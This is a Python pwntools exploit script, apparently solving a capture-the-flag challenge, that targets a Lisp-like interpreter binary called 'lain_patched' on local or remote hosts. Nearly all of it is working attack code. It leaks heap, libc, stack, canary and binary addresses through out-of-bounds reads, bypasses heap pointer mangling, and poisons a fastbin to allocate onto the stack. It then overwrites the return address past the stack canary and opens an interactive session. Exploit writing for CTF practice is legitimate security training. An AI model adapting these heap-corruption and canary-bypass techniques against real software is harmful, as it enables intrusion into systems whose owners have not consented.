from pwn import *

libc = ELF("./libc.so.6")
exe = ELF("./lain_patched")

context.terminal = "alacritty -e".split()
if args.REMOTE:
    io = remote("795db1b.678470.xyz", 32457)
    #io = remote("0.0.0.0", 5000)
elif args.GDB:
    io = gdb.debug("./lain_patched", aslr=False)
else:
    io = process("./lain_patched", aslr=False)
    #attach(io)

io.sendlineafter(b"<<< ", b'(+ 0 "AABB")')
heap_leak = int(io.recvline())
info(f"heap_leak: {hex(heap_leak)}")

# Do a bunch of random allocations so there are libc addresses on the heap.
for i in range(20):
    payload = f'"{"C" * 200}" '
    payload = f'(+ {payload * 3} "A")'
    io.sendlineafter(b"<<< ", payload.encode())

# This is done so the string sizes are overwritten for leaking after this.
io.sendlineafter(b"<<< ", f'(+ "@@@@@@@@" "@@@@@@@@" "@@@@@@@@")'.encode())

# Get all the leaks.
io.sendlineafter(b"<<< ", f'(+ "@" {heap_leak+3416})'.encode())
io.recv(1)
libc_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"libc_leak: {hex(libc_leak)}")
libc.address = libc_leak - 2206944

io.sendlineafter(b"<<< ", f'(+ "@" {libc.sym["__environ"]})'.encode())
io.recv(1)
stack_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"stack_leak: {hex(stack_leak)}")

io.sendlineafter(b"<<< ", f'(+ "@" {stack_leak-144+1})'.encode())
io.recv(1)
stack_canary = u64(io.recv(7).rjust(8, b"\x00"))
info(f"stack_canary: {hex(stack_canary)}")

io.sendlineafter(b"<<< ", f'(+ "@" {stack_leak-112})'.encode())
io.recv(1)
bin_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"bin_leak: {hex(bin_leak)}")
exe.address=bin_leak-19776

io.sendlineafter(b"<<< ", f'(+ "@" {heap_leak+7208})'.encode())
io.recv(1)
heap_key = u64(io.recv(8).ljust(8, b"\x00"))
info(f"heap_key: {hex(heap_key)}")

# Corrupt 0x20 fastbins inside of the heap so fwd ptr points to the stack.
stack_xor = (stack_leak-10392-16) >> 12
payload = b"##\x00" + p64(0)*2 + p64(0x21) + \
    p64((stack_leak-10392-16)^heap_leak>>12)
io.sendlineafter(b"<<< ", b'"BEG ' + payload + b'"')

# Spray the stack with p64(0x21) values so ptmalloc wont complain about
# corrupted size. The overwritten fastbin points to a place on the stack
# where there are the 0x21 values.
io.sendlineafter(b"<<< ", b'"aaabbbb' + p64(0x21) * (1000) + b'"')
# Corrupt the stack. yay!
io.sendlineafter(b"<<< ", b'"AAAA" "AAAA\x00BB' + p64(stack_canary) * 2 + \
                 p64(exe.sym['you_should_be_able_to_solve_this']+1) + b'"')

io.interactive()

